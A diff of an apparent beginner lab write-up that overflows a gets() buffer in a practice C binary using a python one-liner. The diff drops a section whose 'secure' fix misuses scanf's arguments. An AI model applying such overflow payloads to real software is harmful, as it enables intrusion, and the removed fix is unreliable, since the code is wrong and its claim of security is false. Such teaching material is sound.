@@ -1,4 +1,4 @@
-cat 0Let's take a look at the source code...
+Let's take a look at the source code...
 
 ```
 #include <stdio.h>
@@ -23,43 +23,16 @@ There is no direct way we can modify that int. However we can see that there is 
 Currently the gets command is writing to a buffer 489 bytes. The int we need to modify is declared right after the buffer, so they should be side by side in memory. So we should need to write 490 bytes to overflow the buffer and change the value of the int, so the if then statement will evaluate as true. I will do this by using python to write 490 characters (1 character = 1 byte) and pipe it into the program.
 
 ```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0$ echo `python -c 'print "1"*490'` | ./b0
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ echo `python -c 'print "1"*490'` | ./b0_64
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ 
+```
+
+So that didn't work. It is probably because there is some padding inbetween the char and the int. Let's try inputting 500 characters.
+
+```
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ echo `python -c 'print "1"*500'` | ./b0_64
 Wait aren't you supposed to be researching? Level Cleared!
 ```
 
 And just like that, we pwned the buffer.
-
-Now let's take a look at patching the bug.
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-
-int main()
-{
-    char buffer[489];
-    int g;
-    g = 0;
-    scanf(buffer, stdin, sizeof(buffer));
-    if(g)
-    {
-        printf("Your first trainning is complete operative.\n");
-    }
-
-}
-```
-
-As you can see, the only change we made was to the gets() command. We replaced it with the scanf command, and specified a limit as
-to how much data it can take in with the "sizeof(buffer)". That argument will ensure that that scanf call will not take in more data
-than the buffer will hold, thus eliminating the vulnerabillity. Let's ensure that it is secure.
-
-```
-guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf$ echo `python -c 'print "1"*490'` | ./b0_secure 
-guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf$ 
-```
-
-And as you can see, the patch works.
-
-
-
 
